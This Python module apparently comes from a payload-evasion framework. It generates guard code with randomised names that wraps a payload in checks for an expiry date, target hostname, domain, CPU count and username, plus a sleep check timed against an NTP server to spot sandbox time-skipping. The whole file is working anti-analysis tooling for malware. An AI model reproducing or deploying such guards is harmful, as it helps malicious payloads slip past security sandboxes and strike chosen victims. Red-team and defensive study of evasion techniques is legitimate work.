"""

This is the helper function for generating a payload

"""

from Tools.Evasion.evasion_common import evasion_helpers
from datetime import date
from datetime import timedelta

def get(expire_payload,hostname,domain,processors,username,sleep):
  payload_code = ''
  num_tabs_required = 0

  if expire_payload.lower() != "x":

      RandToday = evasion_helpers.randomString()
      RandExpire = evasion_helpers.randomString()

      todaysdate = date.today()
      expiredate = str(todaysdate + timedelta(days=int(expire_payload)))

      # Create Payload code
      payload_code += '\t' * num_tabs_required + 'from datetime import datetime\n'
      payload_code += '\t' * num_tabs_required + 'from datetime import date\n'
      payload_code += '\t' * num_tabs_required + RandToday + ' = datetime.now()\n'
      payload_code += '\t' * num_tabs_required + RandExpire + ' = datetime.strptime(\"' + expiredate[2:] + '\",\"%y-%m-%d\") \n'
      payload_code += '\t' * num_tabs_required + 'if ' + RandToday + ' < ' + RandExpire + ':\n'

      # Add a tab for this check
      num_tabs_required += 1

  if hostname.lower() != "x":

      rand_hostname = evasion_helpers.randomString()

      payload_code += '\t' * num_tabs_required + 'import platform\n'
      payload_code += '\t' * num_tabs_required + rand_hostname + ' = platform.node()\n'
      payload_code += '\t' * num_tabs_required + 'if ' + rand_hostname + ' in \"' + hostname + '\":\n'

      # Add a tab for this check
      num_tabs_required += 1

  if domain.lower() != "x":

      rand_domain = evasion_helpers.randomString()

      payload_code += '\t' * num_tabs_required + 'import socket\n'
      payload_code += '\t' * num_tabs_required + rand_domain + ' = socket.getfqdn()\n'
      payload_code += '\t' * num_tabs_required + 'if ' + rand_domain + ' in \"' + domain + '\":\n'

      # Add a tab for this check
      num_tabs_required += 1

  if processors.lower() != "x":

      rand_processor_count = evasion_helpers.randomString()

      payload_code += '\t' * num_tabs_required + 'import multiprocessing\n'
      payload_code += '\t' * num_tabs_required + rand_processor_count + ' = multiprocessing.cpu_count()\n'
      payload_code += '\t' * num_tabs_required + 'if ' + rand_processor_count + ' >= ' + processors + ':\n'

      # Add a tab for this check
      num_tabs_required += 1

  if username.lower() != "x":

      rand_user_name = evasion_helpers.randomString()

      payload_code += '\t' * num_tabs_required + 'import getpass\n'
      payload_code += '\t' * num_tabs_required + rand_user_name + ' = getpass.getuser()\n'
      payload_code += '\t' * num_tabs_required + 'if \'' + username + '\'.lower() in ' + rand_user_name + '.lower():\n'

      # Add a tab for this check
      num_tabs_required += 1

  if sleep.lower() != "x":

      rand_time_name = evasion_helpers.randomString()

      payload_code += '\t' * num_tabs_required + 'from time import sleep\n'
      payload_code += '\t' * num_tabs_required + 'from socket import AF_INET, SOCK_DGRAM\n'
      payload_code += '\t' * num_tabs_required + 'import sys\n'
      payload_code += '\t' * num_tabs_required + 'import datetime\n'
      payload_code += '\t' * num_tabs_required + 'import time\n'
      payload_code += '\t' * num_tabs_required + 'import socket\n'
      payload_code += '\t' * num_tabs_required + 'import struct\n'
      payload_code += '\t' * num_tabs_required + 'client = socket.socket(AF_INET, SOCK_DGRAM)\n'
      payload_code += '\t' * num_tabs_required + 'client.sendto((bytes.fromhex("1b") + 47 * bytes.fromhex("01")), ("us.pool.ntp.org",123))\n'
      payload_code += '\t' * num_tabs_required + 'msg, address = client.recvfrom( 1024 )\n'
      payload_code += '\t' * num_tabs_required + rand_time_name + ' = datetime.datetime.fromtimestamp(struct.unpack("!12I",msg)[10] - 2208988800)\n'
      payload_code += '\t' * num_tabs_required + 'sleep(' + sleep + ')\n'
      payload_code += '\t' * num_tabs_required + 'client.sendto((bytes.fromhex("1b") + 47 * bytes.fromhex("01")), ("us.pool.ntp.org",123))\n'
      payload_code += '\t' * num_tabs_required + 'msg, address = client.recvfrom( 1024 )\n'
      payload_code += '\t' * num_tabs_required + 'if ((datetime.datetime.fromtimestamp((struct.unpack("!12I",msg)[10] - 2208988800)) - ' + rand_time_name + ').seconds >= ' + sleep + '):\n'

      # Add a tab for this check
      num_tabs_required += 1

  return (payload_code, num_tabs_required)